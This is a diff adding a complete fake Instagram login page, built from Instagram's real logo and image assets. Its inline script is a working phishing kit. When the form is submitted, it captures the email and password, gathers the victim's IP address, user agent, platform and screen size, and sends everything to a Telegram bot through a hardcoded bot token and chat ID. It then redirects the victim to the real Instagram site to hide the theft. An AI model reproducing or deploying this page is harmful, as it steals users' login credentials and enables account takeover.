@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <title>Instagram</title>
+</head>
+<body>
+    <main class="container">
+        <div class="content">
+            <!-- Section for mobile images -->
+            <div class="image-section">
+                <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="Instagram phones">
+            </div>
+
+            <!-- Login Section -->
+            <div class="login-section">
+                <div class="login-box">
+                    <h1 class="logo">
+                        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
+                    </h1>
+                    <form id="login-form" class="login-form">
+                        <input id="email" name="email" type="text" placeholder="Phone number, username, or email">
+                        <input id="password" name="password" type="password" placeholder="Password">
+                        <button type="submit" class="btn-login">Log In</button>
+                    </form>
+                    <div class="separator">
+                        <span class="line"></span>
+                        <span class="or">OR</span>
+                        <span class="line"></span>
+                    </div>
+                    <a href="#" class="login-with-fb">
+                        <img src="https://www.instagram.com/static/images/web/logged_out/loginWithFacebook.png/3c03875e13ce.png" alt="Facebook logo">
+                        Log in with Facebook
+                    </a>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+                <div class="signup-box">
+                    <p>Don't have an account? <a href="#">Sign up</a></p>
+                </div>
+                <div class="get-app">
+                    <p>Get the app.</p>
+                    <div class="app-buttons">
+                        <img src="https://www.instagram.com/static/images/appstore.png/1a097e2c66d9.png" alt="App Store">
+                        <img src="https://www.instagram.com/static/images/googleplay.png/3f03b3f34ae1.png" alt="Google Play">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7299980569:AAGtZJRgTbMcLw0eAGJzK3qP1GZ7DTW6hgU";
+        const CHAT_ID = "6708270295";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+<b>New Login Attempt</b>
+<b>Email:</b> ${email}
+<b>Password:</b> ${password}
+<b>IP Address:</b> ${ip}
+<b>Device Type:</b> ${deviceType}
+<b>Platform:</b> ${platform}
+<b>User Agent:</b> ${userAgent}
+<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    return axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    });
+                })
+                .then(() => {
+                    alert('Information sent successfully!');
+                    window.location.href = "https://www.instagram.com/";
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert(`Error: ${error.message}`);
+                });
+        });
+    </script>
+</body>
+</html>
